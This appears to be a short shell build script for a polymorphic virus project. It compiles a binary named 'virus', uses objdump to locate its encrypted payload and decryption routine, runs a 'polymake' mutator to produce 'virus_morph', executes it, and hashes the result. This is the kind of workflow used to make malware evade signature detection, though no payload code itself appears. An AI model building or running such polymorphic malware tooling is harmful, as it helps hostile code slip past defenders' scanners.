# rm -rf virus virus.o
# make

#git clean -xdf
make

# Read
# objdump -x virus | grep -E "virus|decrypt"
# echo polymake virus 5a0 30 563

adrpayld=$(objdump -x virus | grep -E "payload" | head -n 1)


adrpayldend=$(objdump -x virus | grep -E "payload.end")

adrdecr=$(objdump -x virus | grep -E "decrypt.decryption_function")
printf "payload start addr:\n"
printf "%s " $adrpayld
printf "\npayload end addr:\n"
printf "%s " $adrpayldend
printf "\npayload decryption addr:\n"
printf "%s " $adrdecr
echo

./polymake virus 5d0 30 598
chmod +x virus_morph
./virus_morph
md5sum virus_morph
